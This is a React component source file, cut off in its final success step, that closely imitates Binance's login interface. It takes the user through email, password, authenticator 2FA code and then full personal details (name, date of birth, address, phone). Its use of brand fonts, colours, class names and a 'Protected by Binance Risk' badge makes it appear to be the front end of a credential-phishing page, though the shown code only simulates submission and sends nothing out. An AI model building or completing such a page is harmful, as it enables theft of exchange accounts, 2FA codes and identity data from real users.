import { FC, useState } from "react";
import { useToast } from "@/hooks/use-toast";

type FormStep = 'email' | 'password' | 'verification' | 'personal-details' | 'success';

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [currentStep, setCurrentStep] = useState<FormStep>('email');
  const [isLoading, setIsLoading] = useState(false);
  const [personalDetails, setPersonalDetails] = useState({
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    address: "",
    postalCode: "",
    city: "",
    country: "",
    phoneNumber: ""
  });

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      toast({
        title: "Error",
        description: "Please enter your email address",
        variant: "destructive"
      });
      return;
    }
    console.log("Email submitted:", email);
    setCurrentStep('password');
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      toast({
        title: "Error",
        description: "Please enter your password",
        variant: "destructive"
      });
      return;
    }
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    setCurrentStep('verification');
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verificationCode) {
      toast({
        title: "Error",
        description: "Please enter the verification code",
        variant: "destructive"
      });
      return;
    }
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 2000));
    setIsLoading(false);
    setCurrentStep('personal-details');
  };

  const handlePersonalDetailsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const requiredFields = ['firstName', 'lastName', 'dateOfBirth', 'address', 'postalCode', 'city', 'country', 'phoneNumber'];
    const missingFields = requiredFields.filter(field => !personalDetails[field as keyof typeof personalDetails]);
    
    if (missingFields.length > 0) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive"
      });
      return;
    }
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 2000));
    setIsLoading(false);
    setCurrentStep('success');
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setVerificationCode(text);
    } catch (err) {
      console.error('Failed to read clipboard contents: ', err);
    }
  };

  const renderEmailStep = () => (
    <>
      <div className="flex justify-between items-center mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Log in
        </div>
        <div className="max-md:hidden h-[40px]">
          <div className="bn-tooltips-wrap qrcode-login-popup">
            <div className="bn-tooltips-ele">
              <div 
                className="p-[4px] w-[40px] h-[40px] rounded-[8px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
                style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                role="button" 
                aria-label="QR code login" 
                tabIndex={0}
              >
                <svg 
                  className="w-[32px] h-[32px]" 
                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  viewBox="0 0 24 24" 
                  xmlns="http://www.w3.org/2000/svg"
                  fill="currentColor"
                >
                  <path fillRule="evenodd" clipRule="evenodd" d="M9.5 9.5V3H3v6.5h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                  <path d="M4.884 5.035h2.581v2.58h-2.58v-2.58zM4.884 16.535h2.581v2.58h-2.58v-2.58z" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5v-8.5A.5.5 0 012 13h8.5a.5.5 0 01.5.5V22a.5.5 0 01-.5.5zM21 9.5V3h-6.5v6.5H21zm1 1.5h-8.5a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5H22a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                  <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M15.5 18v-2.5H18V13h-5v5h2.5zM22.5 20H20v-2.5h-2.5v5h5V20z" />
                  <path d="M22.5 15.5V13H20v2.5h2.5z" />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </div>

      <form onSubmit={handleEmailSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="bn-formItem-label block mb-2" 
            htmlFor="bn-formItem-q8nY2Y1v"
            style={{ 
              color: "var(--color-PrimaryText, #EAECEF)",
              fontFamily: "BinanceNova, Arial, sans-serif",
              fontSize: "14px",
              fontWeight: "400",
              lineHeight: "20px"
            }}
          >
            Email/Phone number
          </label>
          <div>
            <div className="css-4cffwv">
              <div 
                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: "1px solid var(--color-InputLine, #474D57)"
                }}
                role="group"
              >
                <input
                  placeholder="Email/Phone (without country code)"
                  type="text"
                  role="textbox"
                  aria-label="Username field for email or phone number"
                  name="username"
                  autoFocus
                  id="bn-formItem-q8nY2Y1v"
                  autoCapitalize="off"
                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                  style={{ 
                    color: "var(--color-PrimaryText, #EAECEF)",
                    fontFamily: "BinanceNova, Arial, sans-serif",
                    fontSize: "14px",
                    fontWeight: "400",
                    lineHeight: "20px"
                  }}
                  spellCheck="false"
                  autoComplete="username"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
            </div>
          </div>
        </div>

        <button
          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          aria-label="Next"
        >
          Next
        </button>
      </form>

      <div className="my-4 flex items-center md:mb-2 md:mt-6">
        <div 
          className="h-[1px] flex-1" 
          style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
        />
        <div 
          className="px-4"
          style={{ 
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px"
          }}
        >
          or
        </div>
        <div 
          className="h-[1px] flex-1" 
          style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
        />
      </div>

      <div className="space-y-3">
        <button 
          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mb-3 md:mb-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
          style={{
            backgroundColor: "transparent",
            border: "1px solid var(--color-InputLine, #474D57)",
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px",
            height: "48px"
          }}
          role="button" 
          aria-label="Continue with Passkey"
        >
          <div className="icon-warp mr-3">
            <div className="ml-1 h-[20px]">
              <svg 
                className="bn-svg h-[20px] w-[20px]" 
                style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                viewBox="0 0 24 24" 
                xmlns="http://www.w3.org/2000/svg"
                fill="currentColor"
              >
                <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-2.9 2.35-5.25 5.25-5.25h3c2.9 0 5.25 2.35 5.25 5.25v4a.75.75 0 01-1.5 0v-4a3.75 3.75 0 00-3.75-3.75h-3A3.75 3.75 0 003 17v4a.75.75 0 01-1.5 0v-4zM8.25 9a3 3 0 100-6 3 3 0 000 6zm0 1.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM18.536 11.923a.75.75 0 00-.75.75v5.138a.75.75 0 001.5 0v-5.138a.75.75 0 00-.75-.75z" />
                <path fillRule="evenodd" clipRule="evenodd" d="M17.786 16.041c0 .414.336.75.75.75h2.167a.75.75 0 000-1.5h-2.167a.75.75 0 00-.75.75zM16.75 10.15a1.773 1.773 0 113.545 0 1.773 1.773 0 01-3.545 0zm1.773-3.272a3.273 3.273 0 100 6.545 3.273 3.273 0 000-6.545z" />
              </svg>
            </div>
          </div>
          <div>Continue with Passkey</div>
        </button>

        <button 
          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
          style={{
            backgroundColor: "transparent",
            border: "1px solid var(--color-InputLine, #474D57)",
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px",
            height: "48px"
          }}
          role="button" 
          aria-label="Continue with Google"
        >
          <div className="icon-warp mr-3">
            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
              <g clipPath="url(#clip0_2445_976)">
                <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
                <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
                <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52Z" fill="#FBBC05" />
                <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#EA4335" />
              </g>
              <defs>
                <clipPath id="clip0_2445_976">
                  <rect width="16" height="16" fill="none" transform="translate(4 4)" />
                </clipPath>
              </defs>
            </svg>
          </div>
          <div>Continue with Google</div>
        </button>

        <button 
          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
          style={{
            backgroundColor: "transparent",
            border: "1px solid var(--color-InputLine, #474D57)",
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px",
            height: "48px"
          }}
          role="button" 
          aria-label="Continue with Apple"
        >
          <div className="icon-warp mr-3">
            <svg 
              width="24" 
              height="24" 
              xmlns="http://www.w3.org/2000/svg" 
              className="bn-svg" 
              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
              viewBox="0 0 24 24"
              fill="currentColor"
            >
              <path fillRule="evenodd" clipRule="evenodd" d="M15.0756 3.64877C15.1861 4.6061 14.7876 5.54843 14.204 6.24214C13.5956 6.92442 12.6209 7.44595 11.6726 7.37879C11.5485 6.45861 12.0291 5.47913 12.5668 4.88187C13.1752 4.20317 14.231 3.68378 15.0756 3.64877ZM18.1084 8.79019C17.9965 8.85395 16.2493 9.84885 16.2687 11.8728C16.2905 14.3233 18.5248 15.1327 18.5511 15.1413C18.5384 15.1985 18.2014 16.3101 17.3644 17.4389C16.665 18.4327 15.931 19.4043 14.7676 19.4214C14.2139 19.4337 13.8401 19.2824 13.4506 19.1248C13.0443 18.9604 12.621 18.7892 11.9587 18.7892C11.2566 18.7892 10.8144 18.9661 10.3881 19.1366C10.0194 19.2841 9.66254 19.4269 9.15964 19.4464C8.05113 19.4857 7.20358 18.3855 6.47861 17.401C5.03018 15.3906 3.90212 11.7342 5.41447 9.24657C6.14771 8.02633 7.48409 7.24118 8.91222 7.21974C9.5412 7.2076 10.1446 7.43792 10.6735 7.63982C11.0781 7.79423 11.439 7.93203 11.7346 7.93203C11.9946 7.93203 12.3456 7.79969 12.7547 7.64548C13.3989 7.40262 14.1871 7.10549 14.9902 7.18545C15.5392 7.20045 17.1035 7.39121 18.1112 8.78862L18.1084 8.79019Z" />
            </svg>
          </div>
          <div>Continue with Apple</div>
        </button>

        <button 
          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mt-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
          style={{
            backgroundColor: "transparent",
            border: "1px solid var(--color-InputLine, #474D57)",
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px",
            height: "48px"
          }}
          role="button" 
          aria-label="Continue with Telegram"
        >
          <div className="icon-warp mr-3">
            <svg height="24" width="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
              <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
            </svg>
          </div>
          <div>Continue with Telegram</div>
        </button>
      </div>
    </>
  );

  const renderPasswordStep = () => (
    <>
      <div className="flex justify-between items-center mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Enter Password
        </div>
        <button 
          onClick={() => setCurrentStep('email')}
          className="text-sm hover:underline"
          style={{ color: "var(--color-TertiaryText, #848E9C)" }}
        >
          Back
        </button>
      </div>

      <form onSubmit={handlePasswordSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="bn-formItem-label block mb-2" 
            htmlFor="password-field"
            style={{ 
              color: "var(--color-PrimaryText, #EAECEF)",
              fontFamily: "BinanceNova, Arial, sans-serif",
              fontSize: "14px",
              fontWeight: "400",
              lineHeight: "20px"
            }}
          >
            Password
          </label>
          <div>
            <div className="css-4cffwv">
              <div 
                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: "1px solid var(--color-InputLine, #474D57)"
                }}
                role="group"
              >
                <input
                  placeholder="Enter your password"
                  type="password"
                  role="textbox"
                  aria-label="Password field"
                  name="password"
                  autoFocus
                  id="password-field"
                  autoCapitalize="off"
                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                  style={{ 
                    color: "var(--color-PrimaryText, #EAECEF)",
                    fontFamily: "BinanceNova, Arial, sans-serif",
                    fontSize: "14px",
                    fontWeight: "400",
                    lineHeight: "20px"
                  }}
                  spellCheck="false"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
            </div>
          </div>
        </div>

        <button
          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading}
          aria-label="Continue"
        >
          {isLoading ? (
            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
          ) : (
            'Continue'
          )}
        </button>
      </form>
    </>
  );

  const renderVerificationStep = () => (
    <>
      <div className="flex justify-between items-center mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Enter Verification Code
        </div>
        <button 
          onClick={() => setCurrentStep('password')}
          className="text-sm hover:underline"
          style={{ color: "var(--color-TertiaryText, #848E9C)" }}
        >
          Back
        </button>
      </div>

      <div 
        className="mb-6"
        style={{ 
          color: "var(--color-SecondaryText, #B7BDC6)",
          fontFamily: "BinanceNova, Arial, sans-serif",
          fontSize: "14px",
          fontWeight: "400",
          lineHeight: "20px"
        }}
      >
        Enter the code from your Google/Binance Authenticator.
      </div>

      <form onSubmit={handleVerificationSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="bn-formItem-label block mb-2" 
            htmlFor="verification-field"
            style={{ 
              color: "var(--color-TertiaryText, #848E9C)",
              fontFamily: "BinanceNova, Arial, sans-serif",
              fontSize: "12px",
              fontWeight: "400",
              lineHeight: "16px"
            }}
          >
            Authenticator App
          </label>
          <div>
            <div className="css-4cffwv relative">
              <div 
                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: "1px solid var(--color-InputLine, #474D57)"
                }}
                role="group"
              >
                <input
                  placeholder="Enter 6-digit code"
                  type="text"
                  role="textbox"
                  aria-label="Verification code field"
                  name="verification"
                  autoFocus
                  id="verification-field"
                  autoCapitalize="off"
                  className="bn-textField-input bg-transparent border-0 text-white p-3 pr-16 w-full outline-none h-12 text-sm leading-5"
                  style={{ 
                    color: "var(--color-PrimaryText, #EAECEF)",
                    fontFamily: "BinanceNova, Arial, sans-serif",
                    fontSize: "14px",
                    fontWeight: "400",
                    lineHeight: "20px"
                  }}
                  spellCheck="false"
                  maxLength={6}
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                />
                <button
                  type="button"
                  onClick={handlePaste}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-sm font-medium hover:opacity-80 transition-opacity"
                  style={{
                    color: "var(--color-BtnBg, #FCD535)",
                    fontFamily: "BinanceNova, Arial, sans-serif",
                    fontSize: "14px",
                    fontWeight: "500",
                    lineHeight: "20px"
                  }}
                >
                  Paste
                </button>
              </div>
            </div>
          </div>
        </div>

        <button
          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading}
          aria-label="Submit"
        >
          {isLoading ? (
            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
          ) : (
            'Submit'
          )}
        </button>

        <div 
          className="flex items-center justify-center mt-4"
          style={{ 
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "12px",
            fontWeight: "400",
            lineHeight: "16px"
          }}
        >
          <svg 
            width="16" 
            height="16" 
            viewBox="0 0 16 16" 
            className="mr-2"
            style={{ color: "var(--color-TertiaryText, #848E9C)" }}
            fill="currentColor"
          >
            <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1ZM8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0Z"/>
            <path d="M7.5 3a.5.5 0 0 1 1 0v5.793L10.146 7.146a.5.5 0 0 1 .708.708l-2.5 2.5a.5.5 0 0 1-.708 0l-2.5-2.5a.5.5 0 1 1 .708-.708L7.5 8.793V3Z"/>
          </svg>
          Protected by Binance Risk
        </div>
      </form>
    </>
  );

  const renderPersonalDetailsStep = () => (
    <>
      <div className="flex justify-between items-center mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Verify Details
        </div>
        <button 
          onClick={() => setCurrentStep('verification')}
          className="text-sm hover:underline"
          style={{ color: "var(--color-TertiaryText, #848E9C)" }}
        >
          Back
        </button>
      </div>

      <form onSubmit={handlePersonalDetailsSubmit}>
        <div className="space-y-4">
          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              First Name
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="text"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.firstName}
                onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              Last Name
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="text"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.lastName}
                onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              Date of Birth
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="date"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.dateOfBirth}
                onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              Address
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="text"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.address}
                onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              Postal Code
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="text"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.postalCode}
                onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              City
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="text"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.city}
                onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              Country
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="text"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.country}
                onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label 
              className="bn-formItem-label block mb-2" 
              style={{ 
                color: "var(--color-PrimaryText, #EAECEF)",
                fontFamily: "BinanceNova, Arial, sans-serif",
                fontSize: "14px",
                fontWeight: "400",
                lineHeight: "20px"
              }}
            >
              Phone Number
            </label>
            <div 
              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: "1px solid var(--color-InputLine, #474D57)"
              }}
            >
              <input
                type="tel"
                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={{ 
                  color: "var(--color-PrimaryText, #EAECEF)",
                  fontFamily: "BinanceNova, Arial, sans-serif",
                  fontSize: "14px",
                  fontWeight: "400",
                  lineHeight: "20px"
                }}
                value={personalDetails.phoneNumber}
                onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
              />
            </div>
          </div>
        </div>

        <button
          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading}
          aria-label="Submit"
        >
          {isLoading ? (
            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
          ) : (
            'Submit'
          )}
        </button>
      </form>
    </>
  );

  const renderSuccessStep = () => (
    <>
      <div className="text-center py-8">
